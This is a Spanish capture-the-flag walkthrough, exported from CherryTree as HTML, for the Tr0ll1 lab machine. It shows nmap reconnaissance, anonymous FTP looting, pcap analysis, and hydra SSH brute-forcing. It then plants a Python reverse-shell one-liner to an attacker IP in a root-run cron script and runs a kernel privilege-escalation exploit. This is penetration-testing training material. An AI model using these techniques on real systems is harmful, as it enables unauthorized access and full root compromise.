<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Resolucion de TROLL1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Resolucion de TROLL1</h1><br/><p><em><strong><h1>TROLL1</h1></strong></em></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> nmap -sn -n 192.168.20.0<span style="color:#000000;font-weight:700">/</span>24<br /></pre></div></p><p></p><p><h3>Descubrimos los HOST activos </h3></p><p></p><p><h3>En este caso sabemos que la maquina es la 192.168.20.128 por lo que escaneamos los puertos activos de forma segura para no ser detectados</h3>.</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> nmap -sS -n -ff --top-ports 5 192.168.20.128</pre></div></p><p></p><p><h3>De nuevo aquí sabemos que esta máquina unicamente tiene los puertos 21,22 y 80 activos</h3>.</p><p></p><p><h3>Ahora vamos a ver que servicios y que versión corren esos puertos:</h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> nmap -sV -n -p21,22,80 192.168.20.128</pre></div></p><p></p><p><img src="images/6-1.png" alt="images/6-1.png" /></p><p></p><p><h3>Como vemos que en este caso el puerto 80 está activo significa que está corriendo alguna aplicacion web así que vamos al navegador a verificar</h3>.</p><p></p><p><h3>En esta aplicación habrá archivos y contenido dentro de la aplicación web utilizando DIRBUSTER etc</h3>.</p><p></p><p><h3>Sabiendo que servicios corren podemos buscar vulnerabilidades publicas y si tienen PoC</h3>.</p><p></p><p><h3>Observamos que tiene un servicio FTP activo en el puerto 21 y que este servicio por defecto implementa un acceso anonimo, por lo que podremos probar.</h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">ftp</span> 192.168.20.128</pre></div></p><p><img src="images/6-2.png" alt="images/6-2.png" /></p><p></p><p><h3>Como vemos esta máquina tiene un login anónimo en FTP</h3>.</p><p></p><p><h3>Listamos archivos y vemos un “lol.pcap” así que lo traemos a la maquina principal:</h3></p><p></p><p><div class="codebox"><pre><br />get lol.pcap<br /><span style="color:#000000;font-weight:700">exit</span></pre></div></p><p></p><p><h3>Abrimos el archivo con WIRESHARK </h3></p><p></p><p><div class="codebox"><pre><br />wireshark lol.pcap<br /></pre></div></p><p></p><p><img src="images/6-3.png" alt="images/6-3.png" /></p><p></p><p><h3>Y vemos registros de inicio de sesion mediante FTP </h3></p><p></p><p><h3>En este tipo de conexiones es interesante ver que archivos y que transferencias se han realizado</h3></p><p></p><p><img src="images/6-4.png" alt="images/6-4.png" /></p><p></p><p><h3>En este caso en un FTP-DATA encontramos algo más de información</h3>.</p><p></p><p><h3>Como vemos es alguna guía para este “juego” indicando que casi pero no.</h3></p><p></p><p>Así<h3> que podríamos intentar buscar algo sobre esta información en la aplicación web</h3>.</p><p></p><p><h3>En el navegador vamos a buscar el directorio </h3><h3>http://192.168.20.128/sup3rs3cr3tdirlol/</h3></p><p></p><p><h3>Encontramos un archivo y lo descargamos</h3>.</p><p></p><p><h3>Si lo abrimos vemos que es un binario en que solo distinguimos algunas cadenas de texto</h3>.</p><p></p><p><img src="images/6-5.png" alt="images/6-5.png" /></p><p></p><p><h3>Como vemos hay algún tipo de pista</h3>.</p><p></p><p><h3>A lo mejor se está refiriendo a la aplicación web</h3> <a href="http://192.168.20.128/0x0856BF/">http://192.168.20.128/0x0856BF/</a></p><p></p><p><h3>Vemos dos carpetas en las que hay dos archivos uno con una contraseña y otro con lo que parece una lista de Usuarios</h3>:</p><p></p><p><div class="codebox"><pre>maleus<br />ps-aux<br />felux<br />Eagle11<br />genphlux &lt; -- Definitely not this one<br />usmc8892<br />blawrg<br />wytshadow<br />vis1t0r<br />overflow</pre></div></p><p><div class="codebox"><pre><br />Good_job_<span style="color:#000000;font-weight:700">:</span>)</pre></div></p><p></p><p><h3>Ahora bien, si recordamos esta maquina tiene varios servicios, FTP, HTTP y SSH, quizá esto indique algún usuario valido para poder acceder por SSH</h3>.</p><p></p><p><h3>Para ello si tenemos el usuario concreto y su contraseña pues lo hacemos manualmente si no podemos usar algunas herramientas automáticas</h3>.</p><p></p><p><h3>Una de las más famosas es HYDRA</h3>:</p><p></p><p><h3>Descargamos los archivos de texto de la maquina a la nuestra con</h3>:</p><p></p><p><div class="codebox"><pre><br />curl http<span style="color:#000000;font-weight:700">://</span>192.168.20.128<span style="color:#000000;font-weight:700">/</span>0x0856BF<span style="color:#000000;font-weight:700">/</span>good_luck<span style="color:#000000;font-weight:700">/</span>which_one_lol.txt &gt; users.txt</pre></div></p><p><div class="codebox"><pre><br />curl http<span style="color:#000000;font-weight:700">://</span>192.168.20.128<span style="color:#000000;font-weight:700">/</span>0x0856BF<span style="color:#000000;font-weight:700">/</span>this_folder_contains_the_password<span style="color:#000000;font-weight:700">/</span>Pass.txt &gt; pass.txt</pre></div></p><p></p><p><h3>Modificamos el documento para eliminar esa cadena de texto innecesaria y vamos con hydra</h3>:</p><p></p><p><div class="codebox"><pre><br />hydra -L users.txt -p <span style="color:#edd400;font-weight:400">&quot;Good_job_:)&quot;</span> 192.168.20.128 <span style="color:#000000;font-weight:700">ssh</span></pre></div></p><p></p><p><h3>Pero parece que no es correcto ya que hydra nos devuelve que no ha encontrado coincidencias</h3>.</p><p></p><p><h3>Teniendo un poco en cuenta que es un juego y que la carpeta donde copiamos la posible contraseña se llama “this_folder_contains_the_password”, pensando un poco y siendo creativos podemos pensar que es “Pass.txt” así que vamos a probar</h3>:</p><p></p><p><div class="codebox"><pre><br />hydra -L users.txt -p <span style="color:#edd400;font-weight:400">&quot;Pass.txt&quot;</span> 192.168.20.128 <span style="color:#000000;font-weight:700">ssh</span></pre></div></p><p></p><p><img src="images/6-6.png" alt="images/6-6.png" /></p><p></p><p><h3>Como vemos en este caso ha conseguido acceso mediante una coincidencia</h3>. </p><p><h3>A todo esto hay que tener en cuenta que todo esto será monitoreado por prácticamente cualquier IDS como SNORT si se realiza así sin más o sin protección por lo que es algo a tener en cuenta ya que hydra basicamente hace un ataque de fuerza bruta</h3>.</p><p></p><p></p><p><h3>En este punto podemos tomar tres caminos:</h3><ul><li>→ <h3>→ Descubrir que proceso nos termina la sesión por timeout </h3></li><li>→ <h3>→ Descubrir ficheros a los que tengamos acceso desde la maquina</h3></li><li>→ <h3>→ Buscar vulnerabilidades para la versión del sistema operativo que esté ejecutando la máquina </h3></li></ul></p><p></p><p><h3>Vamos a ver si podemos eliminar o configurar el proceso que nos termina la sesión</h3>:</p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">cd</span> <span style="color:#000000;font-weight:700">/</span>var<span style="color:#000000;font-weight:700">/</span>log</pre></div></p><p></p><p><h3>Listamos y vemos un archivo cronlog que si analizamos está ejecutando un archivo llamado cleaner.py </h3></p><p></p><p><img src="images/6-7.png" alt="images/6-7.png" /></p><p></p><p><h3>Buscamos donde se encuentra ese archivo y vemos su contenido</h3></p><p></p><p><img src="images/6-8.png" alt="images/6-8.png" /></p><p></p><p><h3>Es un script en python que de forma recursiva elimina a todo el contenido de la carpeta tmp pero si vemos quien ejecuta este archivo es el usuario root y tiene un problema de seguridad y es que el archivo se puede modificar por cualquier usuario</h3>.</p><p></p><p><h3>Buscamos un script de python para activar un reverse shell desde el archivo</h3>:</p><p></p><p><h3>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#ad7fa8;font-weight:400">import</span> socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span style="color:#edd400;font-weight:400">&quot;192.168.20.129&quot;</span>,<span style="color:#edd400;font-weight:400">4242</span>));os.dup2(s.fileno(),<span style="color:#edd400;font-weight:400">0</span>);os.dup2(s.fileno(),<span style="color:#edd400;font-weight:400">1</span>);os.dup2(s.fileno(),<span style="color:#edd400;font-weight:400">2</span>);pty.spawn(<span style="color:#edd400;font-weight:400">&quot;/bin/sh&quot;</span>)</pre></div></p><p></p><p><h3>Con un nano vamos a modificar el script de python añadiendo esa linea de ejecución y vamos escuchar por el puerto con netcat:</h3></p><p></p><p><div class="codebox"><pre><br />nano <span style="color:#000000;font-weight:700">/</span>lib<span style="color:#000000;font-weight:700">/</span>log<span style="color:#000000;font-weight:700">/</span>cleaner.py</pre></div></p><p><div class="codebox"><pre><br />netcat -lvp 4242</pre></div></p><p></p><p><h3>Y cuando el archivo se ejecute veremos como obtenemos una reverse shell de la maquina con privilegios root</h3></p><p></p><p><img src="images/6-9.png" alt="images/6-9.png" /></p><p></p><p><h3>De nuevo esto es una maquina preparada por lo que en el mundo real no se encuentran esos script en diseñados para poder explotarlos</h3>.</p><p></p><p><h3>Pero si que en un caso real podemos hacer un análisis sobre vulnerabilidades que tenga algún servicio desactualizado que proporcione una brecha de seguridad que podamos explotar</h3></p><p></p><p><h3>Por ejemplo hay un exploit del kernel de linux en su versión 3.13.0 en las versiones de Ubuntu 12.04/14.04/14.10/15.04 </h3><h3>https://www.exploit-db.com/exploits/37292</h3></p><p></p><p><h3>Para probarlo podemos copiar el exploit e ir a una dirección donde el usuario de ssh pueda escribir como es TMP</h3>:</p><p></p><p><div class="codebox"><pre><br />pico exploit.c</pre></div></p><p></p><p><h3>Pegamos el exploit</h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">gcc</span> exploit.c -o hacked<br />.<span style="color:#000000;font-weight:700">/</span>hacked</pre></div></p><p></p><p><h3>Y como vemos tenemos escalado de privilegios</h3></p><p></p><p><img src="images/6-10.png" alt="images/6-10.png" /></p><p></p><p></p><p></p></div>
</body>
</html>
